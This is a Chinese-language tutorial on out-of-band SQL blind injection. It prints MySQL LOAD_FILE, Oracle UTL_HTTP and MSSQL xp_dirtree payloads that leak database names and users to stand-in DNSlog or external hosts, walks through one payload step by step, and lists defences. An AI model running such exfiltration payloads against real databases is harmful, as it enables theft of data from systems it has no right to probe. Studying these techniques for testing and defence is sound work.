# 盲注
在进行 **SQL 盲注** 时，使用外部服务器或 DNSlog 是一种非常有效的方式，可以帮助你在无法直接获得返回响应或查询结果时，验证注入是否成功，并获取数据库中的信息。

### 外部服务器与 DNSlog 的作用：
通过利用 **外部服务器** 或 **DNSlog 服务**，你可以让数据库向外部发出 HTTP 或 DNS 请求，并通过这些请求获取数据库中的数据。这种方法通常用于 **盲注** 场景，特别是当无法通过页面响应获取有用的信息时。

### 基本思路：
1. 构造带有外部服务器地址或 DNSlog 域名的 SQL 查询。
2. 如果注入成功，数据库会向你的外部服务器发出请求，这时你可以通过服务器的日志或 DNSlog 平台捕获请求，进而推测数据。

### 1. **利用 DNSlog 服务**：
DNSlog 是一种捕获外部 DNS 请求的服务。你可以使用一些在线 DNSlog 工具（例如 **DNSlog.cn** 或者 **Burp Collaborator**）来生成一个临时域名，查询这个域名时，服务器会记录所有访问到该域名的 DNS 请求。

#### 步骤：
1. **获取 DNSlog 服务域名**：
   - 注册并登录 DNSlog 服务（如 **DNSlog.cn**），获取一个唯一的域名。
   
2. **构造 SQL 注入语句**：
   - 将这个域名插入到 SQL 查询中，构造恶意请求。例如：
   ```sql
   SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog-server.com'));
   ```
   - 或者使用 `INTO OUTFILE`、`XP_FILEEXIST`、`LOAD_FILE()`、`UTL_HTTP.request()` 等函数发送 DNS 请求：
   ```sql
   SELECT UTL_HTTP.request('http://your-dnslog-server.com/'||(SELECT user FROM dual));
   ```

3. **捕获请求**：
   - 当数据库解析并执行注入的 SQL 查询时，它会尝试访问你的 DNSlog 服务器，你可以在 DNSlog 控制台上捕获到该请求。
   - 根据请求的内容，你可以推测出数据库中查询的数据。

#### 示例：
假设你想获取数据库的名称，构造如下 SQL 语句：
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog-server.com'));
```
执行后，如果注入成功，你可以在 DNSlog 服务器的日志中看到类似 `database_name.dnslog-server.com` 的 DNS 请求。

### 2. **利用外部 HTTP 服务器**：
通过让数据库发起 HTTP 请求到你的外部服务器，你可以通过服务器日志捕获请求，并获取一些关键信息。这种方法和 DNSlog 相似，但利用了 HTTP 请求。

#### 步骤：
1. **设置外部服务器**：
   - 你可以使用任何可以捕获请求的服务器（如 VPS、AWS 实例），并监听传入的 HTTP 请求。
   - 在服务器上设置一个 HTTP 服务器（如 Apache、Nginx、Python 的 `http.server` 等），并记录所有的访问日志。

2. **构造 SQL 注入语句**：
   - 利用 `UTL_HTTP`（在 Oracle 中）、`LOAD_FILE`、`INTO OUTFILE`、`xp_dirtree`（在 MSSQL 中）等函数构造外部请求：
   ```sql
   SELECT UTL_HTTP.request('http://your-external-server.com/'||(SELECT user FROM dual));
   ```
   - 或者使用 MSSQL 中的 `xp_dirtree` 命令：
```
   EXEC xp_dirtree '\\your-external-server.com\'+(SELECT user);
```
3. **捕获 HTTP 请求**：
   - 当数据库服务器执行了注入查询后，它会向你的服务器发送 HTTP 请求。
   - 通过检查服务器的日志，捕获传入的请求，你可以看到注入过程中获取的信息。

### 3. **使用 Burp Collaborator**：
**Burp Suite** 的 **Collaborator** 功能是一种非常方便的外部服务，它可以生成一个唯一的 DNS 或 HTTP 地址来帮助你检测盲注、命令执行等漏洞。

#### 步骤：
1. **启动 Burp Collaborator**：
   - 打开 Burp Suite，导航到 `Burp Collaborator` 页面，生成一个唯一的 Collaborator 域名。

2. **构造 SQL 注入语句**：
   - 将生成的 Burp Collaborator 域名嵌入到 SQL 注入查询中：
   ```sql
   SELECT UTL_HTTP.request('http://burp-collaborator-server.com/'||(SELECT user FROM dual));
   ```

3. **查看 Collaborator 结果**：
   - 在 Burp Collaborator 中捕获并查看请求，你可以看到数据库发出的请求，进而推测出查询的结果。

### 防御措施：
1. **输入验证和过滤**：对所有输入进行严格的验证和过滤，防止恶意 SQL 注入。
2. **使用参数化查询**：采用参数化查询来避免将用户输入直接插入 SQL 查询语句中。
3. **限制网络访问**：限制数据库服务器访问外部网络的能力，防止它能够向外部服务器发出 HTTP 或 DNS 请求。
4. **监控异常网络请求**：在安全日志中监控异常的网络请求，尤其是向不受信任的外部服务器的请求。

通过使用外部服务器和 DNSlog，你可以绕过传统的盲注限制，逐步从目标数据库中提取信息。然而，防御这些攻击的方法也非常重要，确保你的系统能够有效抵御此类攻击。

# dnslog盲注语句解析
这条 SQL 语句使用了 MySQL 的 **`LOAD_FILE()`** 函数，结合 **DNSlog** 技术，目的是通过服务器向外部发送 DNS 请求，从而将数据库的信息泄露到攻击者的服务器上。让我们逐步解析这条语句：
### 语句解析：

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.dnslog-server.com'));
```

1. **`LOAD_FILE()`**：
   - 这是 MySQL 中的一个函数，通常用于读取服务器文件系统中的文件内容。`LOAD_FILE()` 函数接收一个文件路径作为参数，并返回该文件的内容。
   - 在这个上下文中，`LOAD_FILE()` 被滥用来访问外部的资源。因为它不局限于读取文件，可以利用它来触发一个 DNS 请求。

2. **`CONCAT()`**：
   - `CONCAT()` 是一个字符串拼接函数。它将传入的多个参数拼接为一个字符串。
   - 这里拼接的部分包括：
     - `'\\\\'`：这代表了一个 UNC 路径，双反斜杠 `\\\\` 在 MySQL 中表示服务器尝试访问网络上的一个共享文件夹或主机。使用这种形式可以通过文件系统访问网络资源。
     - `(SELECT database())`：这是一个子查询，用来获取当前数据库的名称。
     - `'.dnslog-server.com'`：这是一个外部 DNS 服务器地址（由攻击者控制的 DNSlog 服务器）。攻击者可以通过这个域名捕获数据库的名称。

3. **`(SELECT database())`**：
   - 这是一个子查询，用于获取当前 MySQL 实例中正在使用的数据库名称。
   - 例如，如果当前数据库名称为 `mydatabase`，那么 `(SELECT database())` 会返回 `'mydatabase'`。

4. **拼接结果**：
   - `CONCAT()` 将上述部分拼接在一起后，生成一个网络共享路径的字符串：
     - 例如，如果数据库名称是 `mydatabase`，那么结果会是：  
       `\\\\mydatabase.dnslog-server.com`

5. **作用**：
   - `LOAD_FILE()` 函数尝试读取这个伪造的网络路径，由于路径是一个外部服务器地址，MySQL 服务器会发出一个 DNS 请求，向 `dnslog-server.com` 解析这个域名。
   - 攻击者通过 **DNSlog** 服务可以捕获到这个请求，从而获取数据库的名称。例如，攻击者可能会在 **DNSlog** 服务上看到类似这样的请求：
     ```
     mydatabase.dnslog-server.com
     ```

### 目的：
这段代码的目的是利用 **DNSlog** 技术通过 **SQL 注入** 提取数据库的名称。它通过伪造的文件路径触发数据库服务器发出 DNS 请求，并将数据泄露到外部 DNS 服务器。

### 适用场景：
这种技术通常用于 **SQL 盲注** 场景下，尤其是在没有页面反馈时，通过外部服务器验证注入是否成功，并获取数据库中的关键信息。

### 防御措施：
1. **禁用危险函数**：在数据库服务器中禁用类似 `LOAD_FILE()`、`INTO OUTFILE` 等能够访问外部文件系统或网络的函数。
2. **输入验证与过滤**：确保所有输入都经过严格的验证和过滤，防止 SQL 注入。
3. **限制数据库网络访问**：数据库服务器应限制向外部网络的访问，避免通过 DNS 或 HTTP 泄露数据。